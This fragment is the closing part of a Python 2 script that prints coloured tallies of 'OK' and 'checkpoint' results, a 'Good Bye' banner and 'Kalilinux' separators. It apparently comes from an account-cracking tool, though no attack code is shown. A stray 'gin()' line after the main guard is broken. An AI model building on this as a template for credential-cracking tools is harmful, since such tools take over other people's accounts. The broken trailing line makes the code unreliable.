	print"\033[1;94mTotal\033[1;92mOK/\x1b[1;91mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	print """
             

\033[1;96m╔═══╗───────╔╗╔══╗
\033[1;96m║╔═╗║───────║║║╔╗║
\033[1;96m║║─╚╬══╦══╦═╝║║╚╝╚╦╗─╔╦══╗
\033[1;96m║║╔═╣╔╗║╔╗║╔╗║║╔═╗║║─║║║═╣
\033[1;96m║╚╩═║╚╝║╚╝║╚╝║║╚═╝║╚═╝║║═╣
\033[1;96m╚═══╩══╩══╩══╝╚═══╩═╗╔╩══╝
\033[1;96m──────────────────╔═╝║
\033[1;96m──────────────────╚══╝
"""
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	raw_input("\n\033[1;97m[\033[1;95mBack\033[1;97m]")
	menu()

if __name__ == '__main__':
	login()
gin()
